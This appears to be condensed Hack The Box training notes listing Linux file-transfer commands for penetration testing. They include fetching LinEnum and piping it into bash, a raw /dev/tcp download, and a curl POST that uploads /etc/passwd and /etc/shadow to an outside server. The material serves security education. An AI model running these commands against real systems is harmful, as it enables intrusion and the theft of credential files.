...
````
frank-106@htb[/htb]$ md5sum id_rsa
...
> frank-106@htb[/htb]$ echo -n '' | base64 -d > id_rsa
...
> frank-106@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

cURL is very similar to wget, but the output filename option is lowercase `-o'.

#### Download a File Using cURL

> frank-106@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
...
> frank-106@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
...
````
frank-106@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
...
> frank-106@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

#### HTTP GET Request

> frank-106@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

#### Print the Response

> frank-106@htb[/htb]$ cat <&3
...
frank-106@htb[/htb]$ sudo systemctl enable ssh
...
> frank-106@htb[/htb]$ sudo systemctl start ssh

#### Checking for SSH Listening Port

````
frank-106@htb[/htb]$ netstat -lnpt
...
> frank-106@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
...
````
frank-106@htb[/htb]$ sudo python3 -m pip install --user uploadserver
...
````
frank-106@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
...
> frank-106@htb[/htb]$ mkdir https && cd https

````
frank-106@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
...
> frank-106@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
...
```
frank-106@htb[/htb]$ python3 -m http.server
...
```
frank-106@htb[/htb]$ python2.7 -m SimpleHTTPServer
...
```
frank-106@htb[/htb]$ php -S 0.0.0.0:8000
...
```
frank-106@htb[/htb]$ ruby -run -ehttpd . -p8000
...
```
frank-106@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
...
```
frank-106@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
